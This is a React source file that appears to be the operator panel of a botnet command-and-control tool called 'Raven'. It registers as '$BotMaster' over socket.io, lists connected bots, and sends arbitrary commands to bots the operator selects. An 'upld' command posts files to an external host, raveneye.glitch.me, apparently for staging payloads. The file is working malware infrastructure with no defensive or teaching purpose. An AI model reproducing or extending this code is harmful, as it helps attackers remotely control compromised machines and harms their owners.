import React, { useState, useEffect, useRef } from "react";
import Terminal from "./components/Terminal";
import Header from "./components/Header";
import Online from "./components/online";
import { io } from "socket.io-client";

const socket = io("http://localhost:4000/", {
  transports: ["websocket"],
  withCredentials: true,
});
function App() {
  const [terminalResponses, setTerminalResponses] = useState([""]);
  const [clearScreen, setClearScreen] = useState(false);
  const [showHeader, setShowHeader] = useState(true);
  const [BotList, setBotList] = useState([]);
  const [selectedBotList, selectBot] = useState([]);
  const [Raven, setRaven] = useState(false);
  const fileInputRef = useRef(null);

  useEffect(() => {
    socket.on("connect", () => {
      socket.emit("intro", "$BotMaster");
    });

    socket.on("BotList", (newBotList) => {
      setBotList(newBotList.map((bot) => bot.botName));
    });

    socket.on("BotReply", (BotReply) => {
      if (BotReply === "clear") {
        setClearScreen(true);
        setRaven(true);
      } else {
        setTerminalResponses((prevResponses) => [
          ...prevResponses.slice(0, -1),
          BotReply,
          "",
        ]);
      }
    });

    return () => {
      socket.off("connect");
      socket.off("BotList");
      socket.off("BotReply");
    };
  }, []);

  useEffect(() => {
    if (clearScreen) {
      setTerminalResponses([""]);
      setClearScreen(false);
      setShowHeader(false);
    }
  }, [clearScreen]);

  const handleInputSubmit = (value) => {
    if (value.trim().toLowerCase() === "clear") {
      setClearScreen(true);
    } else if (value.trim().toLowerCase() === "exit") {
      window.location.reload();
    } else if (value.trim().toLowerCase() === "upld") {
      fileInputRef.current.click();
    } else {
      const data = { cmd: value, user: "$BotMaster", target: selectedBotList };
      socket.emit("command", data);
    }
  };

  const handleFileUpload = async (event) => {
    const file = event.target.files[0];
    if (!file) return;

    const formData = new FormData();
    formData.append('file', file);

    try {
      const response = await fetch('https://raveneye.glitch.me/upload', {
        method: 'POST',
        body: formData,
      });

      const result = await response.text();
      setTerminalResponses((prevResponses) => [
        ...prevResponses.slice(0, -1),
        `Upload Result: ${result}`,
        "",
      ]);
    } catch (error) {
      setTerminalResponses((prevResponses) => [
        ...prevResponses.slice(0, -1),
        'Error uploading file.',
        "",
      ]);
      console.error('Error:', error);
    }
  };

  return (
    <div className="relative bg-gray-900 text-[#00FF00] p-4 font-[JetBrains Mono] md:leading-[1.6rem] md:text-[1rem] text-[.8rem] min-h-screen">
      {showHeader && <Header />}
      <div className="absolute top-0 right-0 p-2">
        {Raven && (
          <Online
            selectedBotList={selectedBotList}
            selectBot={selectBot}
            onlineBotList={BotList}
          />
        )}
      </div>
      {terminalResponses.map((response, index) => (
        <div key={index}>
          <Terminal
            Raven={Raven}
            onInputSubmit={handleInputSubmit}
            clearScreen={clearScreen}
          />
          {response && <pre>{response}</pre>}
        </div>
      ))}
      {/* Hidden file input */}
      <input
        type="file"
        ref={fileInputRef}
        style={{ display: 'none' }}
        onChange={handleFileUpload}
      />
    </div>
  );
}

export default App;
